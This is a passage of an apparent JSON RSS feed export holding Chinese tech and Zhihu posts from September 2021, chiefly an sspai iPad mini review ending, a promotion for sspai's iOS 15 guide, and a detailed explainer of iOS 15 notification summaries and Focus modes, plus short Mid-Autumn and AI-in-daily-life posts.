仿生芯片、Liquid 视网膜屏的 iPad mini 已经绰绰有余。</p>\n<p>还是要说，这台 iPad mini 依然有一些不得不提的不足之处。</p>\n<p>集成 Touch ID 的电源按键、横向双扬声器系统是新款 iPad mini 的又一项重要更新，却在游戏体验方面带来了不便。由于电源按钮被放在了设备横向的侧面，「正向」握持时，Touch ID 按键位于设备左上方，使用起来会更为直观和顺手；但是这样的握持姿势下，玩游戏时手掌极易盖住 2 侧扬声器，让音频效果大打折扣。反过来拿 iPad 虽然可以解决遮挡扬声器的问题，Touch ID 按键被移到了右下方，使用起来又变得不便了。</p>\n<h2>一台更「纯粹」的 iPad</h2>\n<p>继续讨论 iPad mini 之前，先来看看 iPad 系列的其它产品。</p>\n<p>除了 iPad mini，其它 iPad 产品都有一个共同之处：支持官方键盘。iPad Pro、iPad Air 支持妙控键盘和键盘式智能双面夹，iPad 支持智能键盘。</p>\n<p>相比之下，在平板电脑设备越来越「桌面化」的今天，「完全」依赖触屏手势、Apple Pencil 完成交互操作的 iPad mini，反而更像是一台「纯粹」的 iPad。</p>\n<p>有了第二代 Apple Pencil，iPad mini 能做事也更多了。有了灵感，磁吸式 Apple Pencil 就在手边，随时随地就能记录；配合 iPadOS 15 的快速备忘录，iPad mini 就像是随身笔记本；得益于第二代 Apple Pencil 更加灵敏和精准的压力感应能力、更灵活的工具切换功能，iPad mini 的记录场景也更加灵活和广泛，能够发挥各种 App 的更多能力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/5ec77a5b5cdfcbbcc6b159f7a90b7e89.jpg\"></figure><p>不少人喜欢拿 iPad mini 与 Kindle 比较，原因也很直观：它们都是单手可控的小屏尺寸设备，都有足够出色的阅读功能和丰富的阅读内容。它们就像是阅读器类产品的两个极端：前者依靠强大的应用生态和 Apple Pencil 这类配件的扩展性，从阅读到笔记再到输出，提供了一套完整的解决方案，拥有更多的可能性；Kindle 则是力图还原纸书阅读体验，还给读者更加纯粹的阅读体验。</p>\n<p>那么，第二代 Apple Pencil、USB-C 接口等新特性的加入，就是让 iPad mini 的这种可能性更进一步。如果你是学生，或者有大量笔记需求，iPad mini 不出意外会是最佳选择；更不要提它还能看漫画、读杂志。当然，Kindle 能带给你的沉浸式阅读体验，有了 iPadOS 15 的通知管理和专注功能，这些也都不在话下。</p>\n<p>最后不要忘了，有了 USB-C 接口，iPad mini 的扩展能力也进一步增强，传照片、做音乐、导视频…… 还有那颗支持「人物居中」的超广角摄像头，这一代 iPad mini 可以说是该有的都有了。比起「笨重」的键盘而言，这些能力或许才是一台便携式设备更应该做到的事。</p>\n<h2>结语</h2>\n<p>聊到这里，iPad mini 适合谁，你的心里应该有了答案。</p>\n<p>比起成为你的下一台电脑，iPad mini 想成为的仅仅是更适合大多数人的那台 iPad。iPad mini 也注定与「生产力」没有太大关系：更好的屏幕、更强的芯片，都是为了成为一台更好的娱乐和内容消费设备。虽然没有 Face ID、ProMotion 高刷新率等等不免有些遗憾，但是这些都与它的市场定价和定位有关。</p>\n<p>不过，买了 iPad mini，你也不一定能成为游戏玩家、笔记高手。再强的芯片、再好的屏幕，这些都不会是你购买 iPad mini 的理由。反过来说，看书、记笔记、玩游戏、看视频…… 这些你之前就在用 iPad mini 做的事，全新 iPad mini 只会做得更好。</p>\n<p>就像 Apple 官网所说：「iPad 的十八般武艺，全在掌中。」这是一台「纯粹」的 iPad，你之前想用 iPad 做的事，iPad mini 都能帮你出色完成。在 5000 元价位区间 (毕竟 64GB 容量太小了)，这就是你目前能够买到的最好的 iPad，不对，是平板电脑。有人可能会说，加 1000 元能买 iPad Air 了，不如再等一等更新；但要知道，iPad Air 的键盘至少也有 1399 元。因此，2000 多元的价格差价之下，如果你仅仅是需要一台「纯粹」的 iPad 产品，那么 iPad mini 或许也是你的唯一选择。</p>\n<p>少数派接下来会持续报道 Apple 新款设备和新系统的更多细节和体验，欢迎你通过 <a href=\"https://sspai.com/page/client\">少数派客户端</a>、<a href=\"https://weibo.com/sspaime\">官方微博</a> 和微信公众号（sspaime）关注我们，第一时间获取最新内容。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68928"},{"title":"921逢中秋，航小科祝您中秋快乐！","date":"2021-09-22 12:09:42","description":"\n<p>月满中秋，阖家团圆。   </p>\n<p>中国载人航天工程于1992年9月21日由中国政府批准实施，代号“921工程”，是中国空间科学实验的重大战略工程之一。</p>\n<p>1992年9月21日，中央政治局常委会批准我国载人航天工程按“三步走”发展战略实施。2010年9月25日，中央政治局常委会议批准《载人空间站工程实施方案》，载人空间站工程正式启动实施。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5007a9674dc5c2828e2ecec4ae2b394f_b.jpg\" data-rawwidth=\"1000\" data-rawheight=\"2041\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic4.zhimg.com/v2-5007a9674dc5c2828e2ecec4ae2b394f_r.jpg\"></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-hang-tian-ke-gong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国航天科工</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/412390150?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"限时福利｜比苹果官方用户手册更易读、更全面：少数派系统指南·iOS 15","date":"2021-09-22 09:40:28","description":"\n<p>🎁评论福利在文末，不要错过！</p>\n<hr>\n<p>抛开硬件所带来的功能差异，仅从软件层面上来看，和一众号称「旗舰机守门员」的两千元档安卓手机相比，高达上万元的 iPhone ，享受到了与价格相对的体验了吗？</p>\n<p>如果你是 Power user，可能会知道通过快捷指令、URL Schemes 等自动化工具，能让 iPhone 变成效率工具。但对于绝大多数用户来说，他们不愿折腾，只想安安心心用手机。尽管 iOS 有着「易于上手」的口碑，苹果官网也提供了 <a href=\"https://support.apple.com/zh-cn/guide/iphone/welcome/ios\">iPhone 用户手册</a>，仍不可避免地遇到这些场景：</p>\n<ul>\n<li>用了很久的 iOS，有些功能和特性从来没用过，也不知道怎么用；</li>\n<li>遇到系统相关的软件问题没处问，去查官文文档又太费时间；</li>\n<li>系统不断更新，网上的经验贴容易过时。</li>\n</ul>\n<p>因此，我们少数派编辑部联合十九位作者，共同制作了 <a href=\"https://sspai.com/series/228\">少数派系统指南·iOS 15</a> 。</p>\n<span class=\"ss-paidSection\" product-id=\"228\" type=\"paidSection\"> </span><p><a href=\"https://sspai.com/series/228\">少数派系统指南·iOS 15</a> 是一份<strong>面向所有 iOS 用户</strong>的指南，让你更全面地了解 iOS 的功能，解决你日常使用时会遇到的烦恼，发挥价格高达万元的 iPhone 应有的价值。</p>\n<h2>五大主题，全面介绍 iOS 的方方面面</h2>\n<p>作为苹果官方制作的 <a href=\"https://support.apple.com/zh-cn/guide/iphone/welcome/ios\">iPhone 用户手册</a>，的确 iOS 用户不可或缺的上手指南。但倘若你仔细去看这份手册的目录和内容，就会意识到它有两个问题：功能介绍不全面；说明书般的文字风格让人难以一直读下去。</p>\n<p>第一个问题是「功能介绍不全面」，具体体现在两个方面：一是对某些功能介绍的太简单；二是对于不在设计意图之内的用法，手册不会介绍。在对<a href=\"https://support.apple.com/zh-cn/guide/iphone/iphc90580097/ios\"> App Store 的介绍</a> 中，这两个问题均有体现。作为 iOS 唯一的应用获取方式，是新老用户不得不碰的一道坎，而在手册中，没有对 App Store 界面的介绍，对应用的购买和内购、账号的支付方式设置等都只有寥寥数语。另外，如果你有临时切换 App Store 区域的需求，这份手册也是不会告诉你怎么做的。</p>\n<p>而在 <a href=\"https://sspai.com/series/228\">少数派系统指南·iOS 15</a> 的 <a href=\"https://sspai.com/post/68898\">App Store 章节</a> 中，花了五千多字来详细介绍 App Store 里的每一项功能和特性，保证你遇到的每一个问题和需求，都尽量能在文中回答到。对于管理订阅、申请退款、换区等等，这种一旦碰上就要挠头的场景，文章也都尽可能覆盖到。</p>\n<p>苹果官方手册的第二个问题是文字风格，写作方式完全就是在写产品说明书，对于工具书这本不是一件完全的坏事，但是对于有些应用来说，例如备忘录和照片，读者更需要作者通过自己的理解来梳理功能和使用场景，而不是简简单单的将按钮的功能描述一遍。</p>\n<p>在 <a href=\"https://sspai.com/series/228\">少数派系统指南·iOS 15</a> ，所有内容将分为五个主题，对 iOS 15 进行全面地介绍：</p>\n<ul>\n<li>\n<strong>认识 iOS</strong>：介绍 iOS 最基本的操作和概念；</li>\n<li>\n<strong>系统功能</strong>：介绍 iOS 中的特色功能，例如专注模式和屏幕使用时间；</li>\n<li>\n<strong>苹果生态</strong>：iOS 不仅是独立的系统，还有许多与其他系统和设置联动的特性；</li>\n<li>\n<strong>生活应用</strong>：讲解 iOS 中自带的应用，你可能会意外这些原生应用如此好用；</li>\n<li>\n<strong>效率工具</strong>：将 iOS 作为你工作的好助手。</li>\n</ul>\n<h2>易读，不折腾</h2>\n<p>在写作时，我们追求以下三个目标：</p>\n<ul>\n<li>\n<strong>全面</strong>：尽可能覆盖到 iOS 系统中的各项特性和功能。我们以当下主流的 iPhone 机型为基础展开介绍，如果有些功能依赖特定硬件或机型，我们也尽可能在相应章节中有所涉及；</li>\n<li>\n<strong>易读</strong>：单调枯燥的介绍参数或设置不是我们的目标，我们希望文章本身有相当的阅读性，让您可以体会到阅读的乐趣，而不仅仅把本指南当作工具书；</li>\n<li>\n<strong>易查</strong>：除了内容在章节编排上有所设计，文章中的标题也尽量是系统功能或特性，这样方便您在查询时可以按图索骥。</li>\n</ul>\n<p>除了前文说的「全面」，我们也希望这份指南是易读、易查的。iOS 相关的内容在互联网上数不胜数，我们希望不论是工具性还是阅读性，都能给你带来远超同类内容的体验。相比遇到问题后再去百度，折腾半天找不到想要的答案，这份系统指南能让你不去折腾，以<strong>最省时省力</strong>的方式找到你想要的答案。</p>\n<p>此外，我们特地邀请了 <a class=\"ss-atUser\" data-mention=\"@SoberStudio\" user-id=\"bs2pa0db34tcs0pmvdg0\" href=\"https://sspai.com/u/sober\">@SoberStudio</a> 来负责系统指南配图的制作，保证所有配图都能简洁清晰的同时，有富有设计美感。</p>\n<h2><strong>加量不加价的及时更新</strong></h2>\n<p>尽管 <a href=\"https://support.apple.com/zh-cn/guide/iphone/welcome/ios\">iPhone 用户手册</a> 是苹果官方出品，但不出人意料地，它并不能保证时时是最新状态。而在 <a href=\"https://sspai.com/series/228\">少数派系统指南·iOS 15</a>，我们将尽可能快地跟随 iOS 的变化来更新内容。除此之外之外，我们将在年底进行增加 <strong>iPadOS 独有特性（例如通用控制）的介绍</strong>，当然，这一切都是<strong>加量不加价</strong>的。</p>\n<h2><strong>和我们一起来优化少数派系统指南</strong></h2>\n<p>当然，我们深知仅凭自己的力量，不可能使这份系统指南尽善尽美，所以希望可以借助你们的力量，一起来完善这份指南。无论你是否购买了这份指南，都可以填写 <a href=\"https://jinshuju.net/f/ONpGBg\">表单</a>，分享你的 iOS 使用技巧。一经采用，我们将赠送您 5 元付费栏目代金券以表感谢。</p>\n<span class=\"ss-paidSection\" product-id=\"228\" type=\"paidSection\"> </span><p>从即日起至 10 月 21 日，限时<strong>八折</strong>特惠购买 <a href=\"https://sspai.com/series/228\">少数派系统指南·iOS 15</a>。在评论区分享你的 iOS 使用技巧，我们将在 10 月 1 号评选三条精彩评论，各赠送一份 <a href=\"https://sspai.com/series/228\">少数派系统指南·iOS 15</a>。</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68915"},{"title":"中秋节，你最难忘的一次团圆是什么样的？","date":"2021-09-22 09:22:51","description":"\n<p>他们，在边疆、在海岛、在深山密林、在大漠沙场……他们坚守战位，用忠诚书写对家国安康的祝愿。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-jun-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国军网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/487438148/answer/2132277635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">17 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/486535560?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你们的家乡过中秋节都吃什么？</a><br><a href=\"http://www.zhihu.com/question/345822451?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">中秋节，你快乐吗？怎么过的呢？</a><br>\n","link":"http://www.zhihu.com/question/487438148/answer/2132277635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"具透 | iOS 15 通知管理和专注模式详解","date":"2021-09-22 08:00:00","description":"\n<p>直到目前手机依然是串联每个人工作、学习和生活重要的工具，不可否认 App 的依然承担着绝大多数人的日常生活。但有不少 App 却会打着功能试用、个性推荐、甚至是明显的广告各式各样的名义大量推送通知，频繁的通知铃声、手机亮起的屏幕会不停地打断和割裂用户的工作、学习、生活甚至是游戏时的体验。</p>\n<p>距离 iOS 12 上大刀阔斧地改革通知系统已经过了三年，今年的 iOS 15 再次迎来了新的一波通知功能上的更新，Apple 借此希望让你可以更好地、更从容且更智能地管理好你的通知，让你享受数字生活的方方面面。</p>\n<h2>全新的通知管理</h2>\n<h3>隐式推送为什么不好用</h3>\n<p>iOS 12 中 Apple 为了解决推送通知引起的打断问题，为用户提供了「隐式推送」的选项，希望借此可以解决<strong>非必要</strong>或是<strong>非紧急通知</strong>导致的铃声、亮起的屏幕这些可能会打断用户注意力的情况。但从今天看来「隐式推送」依然有着下列几点问题：</p>\n<ul>\n<li>设置选项分离</li>\n<li>呈现形式不佳</li>\n<li>控制不够灵活</li>\n</ul>\n<p>我知道「隐式推送」可以直接在「某条通知」-「左滑」-「选项」里直接做调整。但是一直以来 Apple 在第一次打开应用询问允许推送时只有「是/否」这两个选项，没办法直接选择隐式推送。这就导致了大部分人并不能在打开 App 的那一刻就拒绝干扰。而后续普通人对 iOS 系统特性不够熟悉，他们基本上就和「隐式推送」无缘了，只能被动地接受打断；再者 Apple 并没有在「设置」-「通知」提供「隐式推送/显示推送」的开关，用户只能一个个点开具体的应用，再把锁屏、横幅、声音给关掉，才能设置好「隐式推送」，我相信大部分的用户都不会有这个耐心去一个个调整的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cb7tb34te2r9sasd0.jpeg\"><figcaption>如果你不知道「隐式推送」，这不怪你</figcaption></figure><p>「隐式推送」的呈现形式也不够好，所有设置了「隐式推送」的通知将仅出现在通知中心中，这就意味着用户在亮起屏幕以后没有办法第一时间接触到所有已经「隐式推送」推送到手机上的通知，用户自然也就没有办法直观地感受到有哪些通知值得一看。再加上不少人普遍没有及时清理通知中心的习惯，「隐式推送」的通知大概率会埋没在别的通知之下，甚至可能会错过广告消息中夹杂的重要消息，让「隐式推送」变成了永不知道的推送。</p>\n<p>「隐式推送」的控制也不够灵活，只能在「隐式推送/显式推送」之间二选一。这意味着如果在某一段时间内一个 App 不断地有通知到来（比如工作群聊和你无关的内容、NAS 的监控短时间警报、朋友的水群），我只能在忍受和「隐式推送」二选一，没有其他选择。</p>\n<p>好在 Apple 也发现了「隐式推送」背后隐含的一系列问题，在 iOS 15 里引入了几个新的通知特性，包括了：</p>\n<ul>\n<li>新的通知逻辑</li>\n<li>通知摘要系统</li>\n<li>临时静音</li>\n</ul>\n<p>希望借这些新功能可以让你更好地管理通知。</p>\n<h3>新的通知逻辑</h3>\n<p>我们可以将 iOS 15 下的通知类型理解成下列三种：</p>\n<ul>\n<li>立刻推送的通知</li>\n<li>定时推送的摘要</li>\n<li>始终立刻推送</li>\n</ul>\n<p><strong>立刻推送</strong>的通知就可以理解成原来的「显示推送」，通知抵达时会根据用户设置显示在「锁屏」、「横幅」和「通知中心」，还会发出声音和显示角标。从用户角度来看，这种类型的推送会有明显的打断感，根据用户设置的不同会有不同程度的打断，比如系统默认的推送设置就是强打断，而只保留「通知中心」、「锁屏」和「角标」的推送打断感会更弱。立刻推送还会受到「专注模式」的影响，此时通知可能不会打扰到处于专注模式的用户。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cb8db34te2nr88ks0.jpeg\"><figcaption>「定时推送摘要」具有显著的入口，也可稍后统一管理。</figcaption></figure><p><strong>定时推送的摘要</strong>，是 iOS 15 中新增的通知逻辑。简单来说就是通知发送到用户手机上以后，这些通知不会有任何提示，会临时性放在「通知中心」-「下个摘要」下（需要打开「通知」-「定时推送摘要」-「显示下一个摘要」，否则将不会显示），等到了用户期望的时间（时间、间隔均可自定义），这些通知会以摘要的形式出现在锁屏页面上。既解决了「隐式推送」呈现效果不佳的问题，还避免了没有必要通知的打断，也能让用户在某一时刻统一处理不重要的内容，但又不错过任何的通知，可以说是一个优秀的解决方案了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cb8lb34te12vuoac0.png\"><figcaption>机器学习自动排序，图文并茂</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cb8tb34te2r9saseg.jpeg\"><figcaption>在「通知中心」或者第一次打开 App 时也可以调整</figcaption></figure><p>定时推送摘要也解决了「隐式推送」的其余问题，你现在既可以从「某条通知」-「左滑」-「选项」将某个应用设置为定时推送摘要，也可以从「通知」-「具体应用」-「定时推送摘要」设置，还可以从「通知」-「具体应用」-「定时推送摘要」-「摘要中的 App」通过开关设置，甚至是第一次打开 App 询问通知权限时也可以直接选择发送到「定时摘要」。不同情况设置「定时摘要」的需求，Apple 都考虑到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cb9db34te2nr88ksg.jpeg\"><figcaption>始终立刻推送</figcaption></figure><p><strong>始终立刻推送</strong>也是 iOS 15 新增的通知逻辑，包括了时效性通知以及重要警告。简单来说时效性通知和重要警告是一种高优先级通知，无论当前用户有没有进入专注模式，或是将软件设置为了定时推送摘要，所有的始终立刻推送通知总会立刻送达。和定时推送摘要不同的是，始终立刻通知需要开发者进行适配，适配了的 App 都可以看到独立的开关。虽然时效性通知和重要警告都可以绕过专注模式和定时推送摘要这两个功能，但是时效性通知没有办法绕过静音开关让通知发出声音，而重要警告可以。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cb9db34te2hplttu0.jpeg\"><figcaption>时效性通知</figcaption></figure><p>为了大家能更好地区分时效性通知和重要警告的不同可以举几个简单的例子：即将到来的日程、待办事项、家庭二氧化碳浓度过高、家人到家、车辆已抵达这样通知就是时效性通知；而类似地震警告、家庭煤气泄漏这样可能危害个人健康或是公共安全的紧急通知就是重要警告，一般重要警告会来自政府、公共机构或是医疗程序。</p>\n<h3>临时静音</h3>\n<p>iOS 15 通知功能的最后一项重要更新就是可以将通知临时静音了，通过临时静音功能可以暂时性避免通知的打扰，以我最常见的使用场景举例：</p>\n<ul>\n<li>朋友们在群里聊得很开心，但你手上刚好再忙，又不想直接阻止这个群的通知</li>\n<li>工作群里在聊的事情和你关系不大，但也不能直接阻止这个群的通知</li>\n<li>邮件串引发的通知风暴，但是你已经在处理这些邮件了</li>\n<li>QNAP 的 NAS 在网络出现问题以后会不断给你推送通知（如果设置的话），但是你已经知道了</li>\n<li>及时降雨提醒 App 每隔一小段时间会发送提醒告诉你即将下雨，但是你身边有伞</li>\n</ul>\n<p>不难看出临时静音功能非常适合这样短时间免打扰的通知。使用临时静音的方法很简单「某条通知」-「左滑」-「选项」可以直接设置，还可以「接下来一小时静音」和「今天静音」之间进行选择，静音是 App 层面的，最后对已经静音的 App 也可以手动解除静音。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cb9tb34te2r9sasfg.jpeg\"><figcaption>临时静音通知</figcaption></figure><h2>灵活的专注模式</h2>\n<h3>一刀切的专注模式未必好用</h3>\n<p>想要避免被各式各样的通知打断，除了针对具体 App 设置不同的通知选项，另外一个办法就是使用专注模式。但在 iOS 14 和以前系统的专注模式同样有着下列问题：</p>\n<ul>\n<li>设置单一，不够适应不同的场景</li>\n<li>仅单一设备，跨平台软件的通知同样会引起打断</li>\n<li>不允许有任何打扰</li>\n</ul>\n<p>专注模式这个功能也几经更新，从一开始只有简单的一个开关，到了可以依据时间、地点、日程设定的多选项自动化，再到后来有了面向睡眠的场景模式，但依旧还是不够，面对不同的场景还是只能使用同一套专注模式。</p>\n<p>就拿大家最常见的工作状态和生活状态举例，工作的时候要尽可能减少来自购物类应用、点评类甚至是闲聊应用的通知；而到了生活状态，我们就希望来自邮件、陌生电话、工作配套应用的打扰更少一点，但是就目前而言你只能选择「一刀切」。</p>\n<p>专注模式通知不能跨平台同步状态也被大家一直所诟病，最常见的例子就是我在手机上启用专注状态以后一旦跨平台软件，比如：Todoist、飞书，只要来了新通知平板、电脑立刻会发出声音进行打断，约等于没启用专注模式。</p>\n<p>目前的专注模式也不允许任何的打扰，像是即将来临的日程、到期的备忘、重要客户的邮件或是其他重要的通知没有办法第一时间收到，还是有一定的概率会错过这样的通知的，而我们大部分情况下又需要这些通知。</p>\n<p>Apple 在 iOS 15 中针对上述情况也做出了对应的调整，带来了更好用的专注模式。</p>\n<h3>分场景，更智能</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cbalb34te12vuoadg.jpeg\"><figcaption>多场景专注设置</figcaption></figure><p>原先，专注模式最大的问题就是「一刀切」，解决这个问题最好的办法就是分场景。iOS 15 中会预设个人、工作、睡眠等等这样面向常见场景的模式，当然也可以自定义添加。添加的过程并不复杂，选择一个场景以后，经过设置允许通知的联系人、允许通知的 App 以及是否允许时效性通知即可完成一个场景的添加工作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cbatb34te12vuoae0.jpeg\"><figcaption>设置简单</figcaption></figure><p>整个过程中系统也会通过本地机器学习建议允许通知的 App 和联系人，完成设置以后也可以随时做额外的调整。允许通知的联系人、允许通知的 App 以及是否允许时效性通知这三项可以简单理解成允许的打扰内容，这样重要或者和当前专注场景有关的通知能直接送达的，而不再是「一刀切」全部不允许。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cbb5b34te2nr88kug.jpeg\"><figcaption>自动和手动启用都非常方便</figcaption></figure><p>新的专注模式同样继承了老专注模式的优点，每个场景都有独立的开关和基于时间、地点、日程设定的多选项自动化关闭。还可以通过时间、地点或是 App 打开的状态自动设定开启具体的专注模式；对于 A11 以后带有神经神经网络引擎的芯片，设备还会自动学习位置、App 使用情况，智能启用功能会适时地<strong>建议或自动打开</strong>特定的专注模式。</p>\n<p>加上跨平台同步的功能，你随时都可以更好地进行工作、学习、生活或者是娱乐。</p>\n<h3>更深入的专注选项</h3>\n<p>新的专注状态也提供了更深入的设置，包括了：锁定屏幕、主屏幕和专注状态三个部分，不同专注状态的设置相互独立互不干扰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cbblb34te2r9sasg0.jpeg\"><figcaption>暗色的锁屏告诉你现在不是用手机的好时候</figcaption></figure><p>锁定屏幕的设置选项并不多，一个是锁屏变暗，另一个则是在锁定屏幕上显示。前者和 iOS 14 下开启睡眠专注模式以后达成效果一致——模糊并添加暗色减弱锁屏壁纸，基本上这个功能我目前也只在睡眠专注模式下打开。「锁定屏幕上显示」则相对值得一提，它将会控制在专注模式下已被静音的通知的呈现形式，如果打开的话已被静音的通知会出现在锁屏上，否则会默认折叠起来；而我除了睡眠专注模式，其他专注模式都会把这个开关打开，一来在点亮屏幕的情况下快速查看期间有哪些新消息，二来这个功能关闭以后，在 iOS 15 beta 5 下<strong>定时推送摘要</strong>也会被折叠，导致摘要没有办法正常显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cbbtb34te12vuoaf0.jpeg\"><figcaption>别忘记打开「锁定屏幕上显示」</figcaption></figure><p>主屏幕是 iOS 15 下新的专注模式控制选项，用户可以在这里设置隐藏通知标记和自定义主屏幕页面。不可否认大部分人的意志力的确不强，无论是通知的角标还是主屏幕图标都可能会吸引到你点开 App，因此想要进一步减少来自 App 的打扰从主屏幕入手也是一个不错的选择。我设置主屏幕的思路很简单，工作专注模式只放和我工作有关的 App 图标和小部件，而到了个人模式我希望我可以随时和我的朋友沟通、快速查看天气甚至是快速点开想看的视频。利用主屏幕编辑功能，还可以在非专注模式下隐藏特点专注模式的主屏幕，因此它不仅仅只是一个简单的专注方式，用户同样可以基于自己的实际使用场景隐藏不需要的杂乱，打造成强大启动器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cbc5b34te2r9sasgg.jpeg\"><figcaption>专门用于工作的主屏幕</figcaption></figure><p>专注状态也是 iOS 15 下新的专注模式控制选项，通过共享专注状态其他联系人和应用可以了解到你已经启用了专注模式，了解到你的通知已经静音此时不宜打扰；在用户允许的情况下，发送信人也可以针对紧急事务选择仍然通知，这样既保证了专注的有效性，也能保证用户可以尽快处理紧急消息。值得一提的是，专注状态也可以同样用于第三方信息 App，像是飞书这样内置勿扰模式的应用在未来也许会同步专注状态信息，让同事知道你已经处于了离开的状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55cbcdb34te2hpltu0g.jpeg\"><figcaption>虽然知道不可能，可是我还是希望「小而美」支持</figcaption></figure><p>为了凸显专注选项的实际用途，我这里拿拿大家最喜闻乐见的「买后爱奇艺」举例。为了体现 iPad 的生产力的价值相信不少读者即使安装了爱奇艺以后，一般会把它塞在 App 资源库里或是放在一个文件夹里；但是如果亲爱的 ta 或者其他和你熟识的人想要借你的 iPad 看剧，只把 iPad 塞到 ta 手里可不够，还要点开具体 App 的位置这样 ta 才不会抱怨；如果 ta 在看剧的时候跨平台的聊天应用来了消息，除了通知铃声会让视频软件失去音频焦点，还会出现通知横幅遮挡视频这样破坏观看体验的情况。在 iOS 15 以后，你可以提前设置一个名叫视频的专注模式，关闭专注模式同步，不允许任何联系人和通知，再定制一个主屏幕，放上视频软件的图标和小部件，方便了 ta <s>也方便了自己</s>。</p>\n<h2>总结</h2>\n<p>受到疫情的影响，今年 iOS 15 新功能明显少于往年。但是不难发现 Apple 受到 WFH<sup class=\"ss-footnote\" href=\"\" title=\"Work from Home，居家办公\" footnote-id=\"1\">1</sup> 的影响，今年的新功能在「拒绝打扰」和「正确通知」方面重点打磨，解决了不少老的逻辑问题，借此希望带给你更好的工作、学习、生活或娱乐体验。但想要更好地、更从容且更智能地管理好通知，依然少不了用户自己的行动，希望这篇文章可以帮助到你。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，带你了解 Apple 新硬件 &amp; 新系统 📱</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68924"},{"title":"身处大数据和人工智能时代，你认为算法对你的生活产生了怎样的影响？","date":"2021-09-22 03:53:40","description":"\n<p>说几个生活的小例子把，<b>可能更体现算法的输出</b>。</p>\n<p><b>一、门禁</b></p>\n<p>也是我常出现的一个问题，那就是比如门禁，自己老是忘记带卡。</p>\n<p>但是人脸识别，可以解决这个问题，导致卡现在基本上都不带了</p>\n<p><b>二、现金</b></p>\n<p>小的时候总是丢钱，长大了，虽然有了钱包，偶尔也生怕钱包丢了。</p>\n<p>而现在可以各种人脸支付，钱包都不用带了，更不用说丢钱了。</p>\n<p><b>三、语音识别</b></p>\n<p>平时如果互相语音，我这边非常吵的时候，就只能等静了再看，现在可以直接语音翻译来看。</p>\n<p><b>以上都是AI带来的快捷</b></p>\n<p>而更多的问题在于信息的泛滥。</p>\n<p>由于AI训练需要大量的数据。</p>\n<p><b>比如推荐算法，会让你很难看到新颖的东西。</b></p>\n<p><b>比如对抗生成，会让很多马赛克消失，换脸，某种意义上是一种（侵权）</b></p>\n<p><b>比如大数据环境下，信息冗杂严重，信息眼花缭乱，也会让人没法沉静。</b></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/seu-aigua-niu-che?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">AI蜗牛车</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a 